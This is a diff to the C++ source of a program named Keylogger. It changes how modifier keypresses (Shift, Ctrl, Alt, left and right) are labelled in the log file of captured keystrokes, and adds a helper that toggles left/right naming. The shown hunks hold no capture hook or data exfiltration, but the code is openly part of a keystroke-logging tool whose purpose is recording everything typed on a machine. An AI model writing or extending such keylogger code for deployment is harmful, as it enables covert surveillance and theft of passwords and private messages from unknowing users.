@@ -1,9 +1,22 @@
 #include "Keylogger.h"
 
+std::string LSHIFT = "SHIFT";
+std::string RSHIFT = "SHIFT";
+std::string LCTRL = "CTRL";
+std::string RCTRL = "CTRL";
+std::string LALT = "ALT";
+std::string RALT = "ALT";
+
+
 int main()
 {
 	// Create a logFile output file stream
 	std::ofstream logFile;
+
+	// Set left and right strings for characters
+	// by prepending L and R appropriately if
+	// we pass true to the following function
+	DifferentiateLeftAndRightKeys(false); // Initially false.
 
 	// If we fail to create a log file,
 	// gracefully exit the program.
@@ -64,23 +77,30 @@ void Log(int keyCode, std::ofstream& logFile, bool shifted, bool capsLockOn)
 		// Do nothing.
 		break;
 	case VK_LSHIFT:
-		logFile << std::endl << "[^LSHIFT]" << std::endl;
+		logFile << std::endl << "[^" << LSHIFT << "]" << std::endl;
 		break;
 	case VK_RSHIFT:
-		logFile << std::endl << "[^RSHIFT]" << std::endl;
+		logFile << std::endl << "[^" << RSHIFT << "]" << std::endl;
 		break;
 	case VK_CONTROL:
-		logFile << std::endl << "[^CTRL]" << std::endl;
+		// We are capturing left AND right controls separately.
+		// Do nothing.
+		break;
+	case VK_LCONTROL:
+		logFile << std::endl << "[^" << LCTRL << "]" << std::endl;
+		break;
+	case VK_RCONTROL:
+		logFile << std::endl << "[^" << RCTRL << "]" << std::endl;
 		break;
 	case VK_MENU:
 		// We are capturing left AND right alts separately.
 		// Do nothing.
 		break;
 	case VK_LMENU:
-		logFile << std::endl << "[^LALT]" << std::endl;
+		logFile << std::endl << "[^" << LALT << "]" << std::endl;
 		break;
 	case VK_RMENU:
-		logFile << std::endl << "[^RALT]" << std::endl;
+		logFile << std::endl << "[^" << RALT << "]" << std::endl;
 		break;
 	case VK_PAUSE:
 		logFile << std::endl << "[^PAUSE]" << std::endl;
@@ -322,6 +342,22 @@ bool CreateOrOpenLogFile(std::ofstream& logFile)
 	}
 
 	return true;
+}
+
+
+// Prepend L & R appropriately if we pass true
+// to this method.
+void DifferentiateLeftAndRightKeys(bool leftAndRightAreDistinct)
+{
+	if (leftAndRightAreDistinct)
+	{
+		LSHIFT = "L" + LSHIFT;
+		RSHIFT = "R" + RSHIFT;
+		LCTRL = "L" + LCTRL;
+		RCTRL = "R" + RCTRL;
+		LALT = "L" + LALT;
+		RALT = "R" + RALT;
+	}
 }
 
 /******************************************************\
